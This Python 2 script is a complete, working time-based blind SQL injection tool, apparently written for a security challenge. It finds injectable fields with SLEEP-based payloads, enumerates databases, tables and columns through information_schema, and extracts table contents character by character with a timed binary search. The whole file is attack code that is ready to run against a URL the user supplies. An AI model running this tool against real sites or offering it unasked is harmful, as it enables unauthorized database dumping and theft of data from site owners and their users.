# Title: Time Based Blind SQL Injection Tool
# Author: Alessio Gilardi

# The tool takes in input an URL, a method, a list of possibly vulnerable fields with the respctive values.
# Once found, the tool ask the user to select a database and a table to dump, after it prints the results.

# Usage: time_based_blind_sql_injection.py [-h] [-u URL] [-d {'<field>': '<value>',...}] [-m <GET|POST>] [-s SLEEP] [-t THREADS] [-v] [-l]


import requests, sys, ast, binascii, argparse, threading

M_GET = 'GET'
M_POST = 'POST'

EVALUATING_ROUNDS = 10 # Numero di esecuzioni per determinare il tempo di risposta del server
threads_num = 1

SQL_SUFFIX_TYPE = ['', '-- -', 'AND \'1\'=\'1']
NO_SUFF = 0
COMMENT_SUFF = 1
AND_SUFF = 2

verbose = 0
log = 0
LOG_FILE_NAME = 'challenge2.md'

# MySQL DB Tables #
INFORMATION_SCHEMA_DB_NAME = 'information_schema'

INF_SCHEMA_SCHEMATA = 'SCHEMATA'
INF_SCHEMA_SCHEMATA_SCHEMA_NAME = 'SCHEMA_NAME' # Nome del db

INF_SCHEMA_TABLES = 'TABLES'
# used in where clause
INF_SCHEMA_TABLES_TABLE_SCHEMA = 'TABLE_SCHEMA'

INF_SCHEMA_TABLES_TABLE_NAME = 'TABLE_NAME'

INF_SCHEMA_COLUMNS = 'COLUMNS'
INF_SCHEMA_COLUMNS_TABLE_NAME = 'TABLE_NAME'
INF_SCHEMA_COLUMNS_COLUMN_NAME = 'COLUMN_NAME'
#########################


# Converte due liste in un dizionario, fields e' l'indice e values i valori
def list_to_dict(fields, values):
    if len(fields) != len(values):
        return 0
    result = {}
    for (f, v) in zip(fields, values):
        result[f] = v
    return result

# Stampa una tabella per l'utente chiedendo di fare una scelta
# (nome del database di cui eseguire il dump, nome della tabella, etc)
def print_user_choice_table(values, title = ''):
    if len(values) == 1:
        print 'Only one value'
        print 'Choice: %s' % values[0]
        return 0
    if title:
        print title

    for i in range(len(values)):
        print str(i+1) + ' - ' + values[i]
    print '\n'

    choice = -1
    while choice < 0 or choice >= (len(values)):
        print '\033[A                             \033[A'
        try:
            choice = int(input('Choice[1 - ' + str(len(values)) + ']:')) - 1
        except Exception as e:
            choice = -1
            pass

    return choice

# Converte un stringa in una lista di interi
# e poi la lista in una stringa con gli interi separati da virgola
def string_to_int_list(s):
    lst = []
    for c in s:
        lst.append(str(ord(c)))
    return ','.join(lst)

# Media olimpica dei tempi di risposta (esclude i due risultati piu' alti)
def avg_time(times):
    if len(times) == 1:
        return times[0]
    max_index = -1
    max_time = 0
    for i in range(len(times)):
        if times[i] > max_time:
            max_time = times[i]
            max_index = i
    times.pop(max_index)

    if len(times) > 1:
        max_index = -1
        max_time = 0
        for i in range(len(times)):
            if times[i] > max_time:
                max_time = times[i]
                max_index = i
    times.pop(max_index)

    return sum(times)/len(times)

# Classe per la gestione dei thread che effettuano le richieste http
class myRequestThread (threading.Thread):
    def __init__(self, threadID, name, url, method, headers, cookies, data, times):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.url = url
        self.method = method
        self.headers = headers
        self.cookies = cookies
        self.data = data
        self.times = times
    def run(self):
        self.times.append(measure_request_time_no_threads(self.url, self.method, self.headers, self.cookies, self.data))

# Misura il tempo di risposta del server per una richiesta
def measure_request_time_no_threads(url, method, headers, cookies, data):
    if method == M_GET:
        r = requests.get(url, headers = headers, cookies = cookies, params = data.items())
        return r.elapsed.total_seconds()
    elif method == M_POST:
        r = requests.post(url, headers = headers, cookies = cookies, data = data.items())
        return r.elapsed.total_seconds()
    else:
        return -1;

# Misura il tempo di risposta di una richiesta o il tempo medio di richieste multiple
def measure_request_time(url, method, headers, cookies, data):
    if threads_num <= 1:
        return measure_request_time_no_threads(url, method, headers, cookies, data)
    else:
        times = []
        threads = []
        for i in range(threads_num):
            t = myRequestThread(i, 'T-'+str(i), url, method, headers, cookies, data, times)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        return avg_time(times)


# Valuta il tempo medio di risposta del server eseguendo
# molte richieste (anche multiple), usato per calcolare lo sleep_time
def evaluate_response_time(url, method, headers, cookies, data):
    times = []
    for i in range(EVALUATING_ROUNDS):
        times.append(measure_request_time(url, method, headers, cookies, data))
    return avg_time(times)

# Valuta lo slee time da usare per le richieste
def evaluate_sleep_time(response_time):
    if response_time < 1:
        return response_time * 10
    elif response_time >= 1 and response_time < 2:
        return response_time * 2
    else:
        return response_time

# Determina quali dei campi passati al tool sono iniettabili e che ti di injection utilizzare ('-- -', '\' AND \'1\'=\'1', '')
def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
    vuln_fields = {}
    sql = '{} AND SLEEP({}) {}'
    m_data = data.copy()

    for field in m_data:
        m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
        elapsed = measure_request_time(url, method, headers, cookies, m_data)
    if elapsed >= sleep_time:
        vuln_fields.update({field:COMMENT_SUFF})
    for field in vuln_fields:
        m_data.pop(field)

    if len(m_data) == 0:
        return vuln_fields

    for field in m_data:
        m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF])
        elapsed = measure_request_time(url, method, headers, cookies, m_data)
    if elapsed >= sleep_time:
        vuln_fields.update({field:AND_SUFF})
    for field in vuln_fields:
        m_data.pop(field)

    if len(m_data) == 0:
        return vuln_fields

    for field in m_data:
        m_data[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
        elapsed = measure_request_time(url, method, headers, cookies, m_data)
    if elapsed >= sleep_time:
        vuln_fields.update({field:NO_SUFF})

    for field in vuln_fields:
        m_data.pop(field)

    return vuln_fields


# Determina il numero di righe di una tabella del database
def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, sleep_time, where_param = '', where_value = ''):
    m_data = data.copy()
    table = db_name + '.' + table_name
    sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
    query = 'SELECT COUNT(*) FROM {}'
    file = ''

    if vuln_type != NO_SUFF:
        sql_inj = '\'' + sql_inj
        if where_param:
            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
        if vuln_type == COMMENT_SUFF:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
        else:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
    else:
        if where_param:
            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))

    if verbose:
        print '\nDeterminating number of rows of table: %s\n' % table_name
    if log:
        file = open(LOG_FILE_NAME, 'a')
        file.write('\nDeterminating number of rows of table: %s\n\n' % table_name)

    found = 0
    count = 0
    while not found:
        m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(table), str(count), str(sleep_time))
        if verbose:
            print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
        if log:
            file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
        elapsed = measure_request_time(url, method, headers, cookies, m_data)
        if elapsed >= sleep_time:
            found = 1
        else:
            count += 1

    if verbose:
        print '\n{}: {} rows\n'.format(table_name, str(count))

    if log:
        file.write('\n{}: {} rows\n\n'.format(table_name, str(count)))
        file.close()

    return count

# Determina il numero di caratteri di un campo del database
def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
                            db_name, table_name, column_name, sleep_time, limit_row = '',
                                where_param = '', where_value = ''):
    m_data = data.copy()
    table = db_name + '.' + table_name
    sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
    query = 'SELECT LENGTH({}) FROM {}'
    limit = ' LIMIT {},1'
    file = ''

    if vuln_type != NO_SUFF:
        sql_inj = '\'' + sql_inj
        if where_param:
            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
        if vuln_type == COMMENT_SUFF:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
        else:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
    else:
        if where_param:
            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))

    if limit_row != '':
            query += limit.format(str(limit_row))

    if verbose:
        print '\nDeterminating number of characters in the field: %s\n\n' % column_name
    if log:
        file = open(LOG_FILE_NAME, 'a')
        file.write('\nDeterminating number of characters in the field: %s\n\n' % column_name)

    found = 0
    length = 0
    while not found:
        length += 1
        m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, table), str(length), str(sleep_time))
        if verbose:
            print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
        if log:
            file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
        elapsed = measure_request_time(url, method, headers, cookies, m_data)
        if elapsed == -1:
            return -1
        if elapsed >= sleep_time:
            found = 1
        if length > 255:
            return -1

    if verbose:
        print '\nField length: %i\n' % length
    if log:
        file.write('\nField length: %i\n\n' % length)
        file.close()

    return length

# Determina il valore di un campo del database
def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, db_field_length, sleep_time, limit_row = '', where_param = '', where_value = ''):
    m_data = data.copy()
    data_val = []
    table = db_name + '.' + table_name
    sql_inj = ' AND IF(({}){}{},SLEEP({}),SLEEP(0))'
    query = 'SELECT ORD(MID({},{},1)) FROM {} '
    limit = ' LIMIT {},1'
    file = ''

    if vuln_type != NO_SUFF:
        sql_inj = '\'' + sql_inj
        if where_param:
            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
        if vuln_type == COMMENT_SUFF:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
        else:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
    else:
        if where_param:
            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))

    if limit_row != '':
            query += limit.format(str(limit_row))

    if verbose:
        print '\nDeterminating values of field: %s\n' % column_name
    if log:
        file = open(LOG_FILE_NAME, 'a')
        file.write('\nDeterminating values of field: %s\n\n' % column_name)

    for i in range(1, db_field_length + 1):
        found = 0
        low = 1
        high = 128

        while not found:
            current = (low + high)//2
            m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '=', current, sleep_time)
            if verbose:
                print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
            if log:
                file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
            elapsed = measure_request_time(url, method, headers, cookies, m_data)

            if elapsed >= sleep_time:
                data_val.append(chr(current))
                found = 1
                if verbose:
                    print '\nFound character: %c\n\n' % chr(current)
            else:
                m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '>', current, sleep_time)
                if verbose:
                    print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
                if log:
                    file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
                elapsed = measure_request_time(url, method, headers, cookies, m_data)
                if elapsed >= sleep_time:
                    low = current
                else:
                    high = current

    if verbose:
        print
    result = ''.join(data_val)
    if log:
        file.write('\nValue: %s\n\n\n' % result)
        file.close()

    return result

def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row = '', where_param = '', where_value = ''):
    length = find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row, where_param, where_value)
    result = find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, length, sleep_time, limit_row , where_param, where_value)
    return result

def main(argv):
    global M_GET, M_POST, threads_num, verbose, log, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_SCHEMA, INF_SCHEMA_TABLES_TABLE_NAME, INF_SCHEMA_COLUMNS, INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_COLUMN_NAME

    parser = argparse.ArgumentParser(description = 'Tool used to perform time based blind sql injection')
    parser.add_argument('-u', '--url', help = 'The URL on which try the attack.')
    parser.add_argument('-d', '--data', help = 'Payload for data fields. {\'<field>\': \'<value>\',...}', default = '\'{{}}\'')
    parser.add_argument('-m', '--method', help = 'The method <GET|POST>.', metavar = '<GET|POST>', default = M_GET, choices = [M_GET, M_POST])
    parser.add_argument('-s', '--sleep', type = int, help = 'The sleep time to use')
    parser.add_argument('-t', '--threads', type = int, help = 'Number of threads used for evaluating response time', default = 1)
    parser.add_argument('-v', '--verbose', help = 'Set verbose mode', action = 'store_true')
    parser.add_argument('-l', '--log', help = 'Set log mode', action = 'store_true')
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    url = args.url
    method = args.method
    data = ast.literal_eval(args.data)
    sleep_time = args.sleep
    threads_num = args.threads

    verbose = args.verbose
    log = args.log

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Connection': 'keep-alive'
    }
    cookies = {}

    databases = [] # List of found databases
    tables = [] # List of tables in the selected database
    columns = [] # List of columns in the selected table
    results = [] # The data dump of the selected table
    db_name = '' # Selected database name
    table_name = '' # Selected table name

    # Inizio dell'attacco #
    print '\nStarting attack on URL: %s\n' % url

    if log:
        file = open(LOG_FILE_NAME, 'w')
        file.write('# Starting attack on URL: %s\n\n' % url)
        file.write('# Using %i thread/s\n' % threads_num)
        file.close()

    # Viene calcolato il tempo di risposta del server e lo sleep time da usare
    if not sleep_time:
        print 'Evaluating response time...'
        avg_resp_time = evaluate_response_time(url, method, headers, cookies, data)
        sleep_time = evaluate_sleep_time(avg_resp_time)

        if log:
            file = open(LOG_FILE_NAME, 'a')
            file.write('# Average response time: %.6f s\n' % avg_resp_time)
            file.write('# Using sleep time: %.6f s\n\n' % sleep_time)
            file.close()

    print 'Using sleep time: %.6f s\n' % sleep_time

    # Trovo i campi vulnerabili #
    print 'Looking for vulnerable fields...\n'
    vuln = find_vuln_fields(url, method, headers, cookies, data, sleep_time)
    vuln_fields = vuln.keys()

    if len(vuln_fields) == 0:
        if log:
            file = open(LOG_FILE_NAME, 'a')
            file.write('\nNo vulnerable field found\n')
            file.close()
        print 'No vulnerable field found'
        sys.exit(0)

    f = print_user_choice_table(vuln_fields, 'Vulnerable fields')
    sel_vuln_field = vuln_fields[f]
    sel_vuln_type = vuln[sel_vuln_field]

    # Cerco i nomi dei database #
    print '\nLooking for database names, please wait...'
    rows_count = find_table_rows_count(url, method, headers, cookies, data,
                    sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, sleep_time)
    for i in range(rows_count):
        databases.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, sleep_time, i))
        print 'Found: %s' % databases[i]
    print
    #######################

    # Seleziono un database
    choice = print_user_choice_table(databases, 'Databases found:')
    db_name = databases[choice]
    print('\nDatabase selected: %s\n' % db_name)

    # Cerco le tabelle del database selezionato
    print 'Looking for tables in %s, please wait...\n' % db_name
    where_param = INF_SCHEMA_TABLES_TABLE_SCHEMA
    where_value = db_name

    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, sleep_time, where_param, where_value)
    for i in range(rows_count):
        tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_NAME, sleep_time, i, where_param, where_value))
    ###########################################

    # Seleziono una tabella #
    choice = print_user_choice_table(tables, 'Tables found:')
    table_name = tables[choice]
    print '\nTable selected: %s\n' % table_name

    # Cerco i nomi delle colonne nella tabella selezionata #
    print 'Looking for columns in %s, please wait...\n' % table_name
    where_param = INF_SCHEMA_COLUMNS_TABLE_NAME
    where_value = table_name
    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, sleep_time, where_param, where_value)
    for i in range(rows_count):
        columns.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, INF_SCHEMA_COLUMNS_COLUMN_NAME, sleep_time, i, where_param, where_value))

    print columns
    ###########################################

    # Cerco i dati nella tabella selezionata #
    print '\nLooking for %s data, please wait...\n' % table_name
    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, db_name, table_name, sleep_time)
    for i in range (rows_count):
        d = []
        for col in columns:
            d.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, db_name, table_name, col, sleep_time, i))
        print d
        results.append(list_to_dict(columns, d))

    if log:
        file = open(LOG_FILE_NAME, 'a')
        file.write('Result of dump of %s:\n' % table_name)
        file.close()

    if len(results) == 0:
        print 'No data in the table: %s' % table_name
        if log:
            file = open(LOG_FILE_NAME, 'a')
            file.write('\nNo data in the table: %s' % table_name)
            file.close()
        sys.exit(0)

    if log:
        file = open(LOG_FILE_NAME, 'a')
        file.write('\n')
        for row in results:
            file.write('%s\n' % str(row))
        file.write('\n')
        file.close()
    print
    print 'Result of dump of ' + table_name + ':'
    for row in results:
        print row

if __name__ == "__main__":
   main(sys.argv[1:])